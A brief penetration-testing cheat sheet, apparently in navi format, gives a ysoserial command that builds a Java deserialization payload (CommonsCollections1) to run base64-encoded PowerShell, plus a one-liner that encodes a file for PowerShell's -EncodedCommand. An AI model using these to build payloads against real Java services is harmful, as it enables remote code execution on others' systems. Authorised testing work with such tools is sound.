# ysoserial

% java, unserialize 

## ysoserial java - generate payload
#plateform/linux #target/local #cat/ATTACK/GENERATE_PAYLOAD 

https://github.com/frohoff/ysoserial

```bash
java -jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_encoded_command>' > <output_file>
```

## convert file to base64 one line
#plateform/linux #target/local #cat/UTILS 

```bash
iconv -f ASCII -t UTF-16LE <file_to_convert> | base64 | tr -d "\n"
```

= lib_payload : CommonsCollections1
